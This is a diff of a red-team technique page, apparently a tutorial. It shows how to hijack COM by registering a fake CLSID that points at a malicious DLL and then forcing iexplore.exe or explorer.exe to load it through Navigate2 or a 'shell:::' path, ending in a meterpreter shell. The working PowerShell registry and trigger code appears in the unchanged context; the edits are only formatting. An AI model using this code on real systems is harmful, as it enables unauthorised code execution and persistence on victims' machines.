@@ -14,11 +14,11 @@ This technique _requires_ iexplore.exe to be running on the target system :)
 
 See [https://labs.nettitude.com/blog/com-and-the-powerthief/](https://labs.nettitude.com/blog/com-and-the-powerthief/) by Rob Maslen for more details on why this technique works.
 
-## Execution
+### Execution
 
 Below is a powershell code that creates a new COM object with a randomly chosen CLSID `55555555-5555-5555-5555-555555555555` which registers our malicious DLL at `\\VBOXSVR\Experiments\evilm64.dll` to handle incoming calls from COM clients:
 
-{% code title="attacker@victim" %}
+{% code title="attacker\@victim" %}
 ```csharp
 # Code borrowed from https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1 by Rob Maslen
 $CLSID = "55555555-5555-5555-5555-555555555555"
@@ -40,15 +40,15 @@ New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name
 
 Once run, we can see that the new COM object got created successfully in the registry:
 
-![](<../../.gitbook/assets/Annotation 2019-06-15 165723.png>)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LhQoQ_SNdWpmPWQJPEc%2F-LhQqxD51KP7f7TSYzhJ%2FAnnotation%202019-06-15%20165723.png?alt=media\&token=c3b0550d-a2e4-450b-a8b1-eb0b1293da19)
 
 We are now ready to execute the payload with the below powershell. What happens here is:
 
 * We're requesting a new instance of the `ShellWindows` `(9BA05972-F6A8-11CF-A442-00A0C90A8F39)` COM object, which actually applies to both explorer.exe and iexplore.exe, meaning with a handle to that object, we can interface with them using their exposed methods
-* Specifically, we are interested in getting an instance of a COM object for iexplore.exe, because its COM server has a method `Navigate2(...)` exposed. The `Navigate2` allows us to programatically instruct the iexplore.exe to navigate to a URL.&#x20;
+* Specifically, we are interested in getting an instance of a COM object for iexplore.exe, because its COM server has a method `Navigate2(...)` exposed. The `Navigate2` allows us to programatically instruct the iexplore.exe to navigate to a URL.
 * We are asking iexplore to navigate to our newly created malicious CLSID pointing to our DLL instead of a URL:
 
-{% code title="attacker@victim" %}
+{% code title="attacker\@victim" %}
 ```csharp
 # force iexplore to load the malicious DLL and execute it
 $shellWinGuid = [System.Guid]::Parse("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
@@ -60,24 +60,23 @@ $shWin.Navigate2("shell:::{$CLSID}", 2048)
 
 Code execution in action, resulting in a meterpreter session:
 
-![](../../.gitbook/assets/iecomhijacking.gif)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LhQoQ_SNdWpmPWQJPEc%2F-LhQr_ht69SoFWBnUvlm%2Fiecomhijacking.gif?alt=media\&token=23f21619-ab53-4b8a-8498-ca1f34033819)
 
-## Shell:::
+### Shell:::
 
 As a fun bonus, it's possible to call our malicious COM object via explorer by navigating to\
 `shell:::{55555555-5555-5555-5555-555555555555}` which forces the explorer.exe to load our malicious DLL:
 
-![](<../../.gitbook/assets/Annotation 2019-06-15 174905.png>)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LhQoQ_SNdWpmPWQJPEc%2F-LhR1kY81cLrlj2uvb0H%2FAnnotation%202019-06-15%20174905.png?alt=media\&token=cccbd44c-ff49-478c-bd30-0be217f1b569)
 
 ...and results in a meterpreter shell:
 
-![](../../.gitbook/assets/explorerhijack.gif)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LhQoQ_SNdWpmPWQJPEc%2F-LhR12XUD9j3fUfOSGHd%2Fexplorerhijack.gif?alt=media\&token=0d0d841c-5f9b-40d5-8cd7-a00083587f5b)
 
-## References
+### References
 
 {% embed url="https://docs.microsoft.com/en-us/windows/desktop/com/component-object-model--com--portal" %}
 
 {% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752094(v%3Dvs.85)" %}
 
 {% embed url="https://labs.nettitude.com/blog/com-and-the-powerthief/" %}
-
